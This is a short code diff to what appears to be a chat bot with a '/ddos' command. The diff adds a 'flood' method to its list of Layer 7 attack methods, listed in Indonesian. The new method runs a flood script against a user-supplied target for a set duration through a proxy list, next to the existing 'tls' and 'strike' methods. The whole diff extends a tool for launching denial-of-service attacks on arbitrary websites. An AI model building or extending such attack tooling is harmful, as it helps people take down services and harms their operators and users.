@@ -102,6 +102,7 @@ bot.command('methods', (ctx) => {
 Berikut adalah metode Layer 7 yang tersedia:
 - tls
 - strike
+- flood
   `;
   ctx.reply(methodsList);
 });
@@ -135,6 +136,7 @@ bot.command('ddos', async (ctx) => {
     const attackMethods = {
       tls: `node ./lib/mt/Tls.js ${target} ${duration} 100 10`,
       strike: `node ./lib/mt/strike.js GET ${target} ${duration} 10 100 proxy.txt`,
+      flood: `node ./lib/mt/floodsX.js ${target} ${duration} 10 100 proxy.txt`,
     };
 
     if (attackMethods[methods]) {
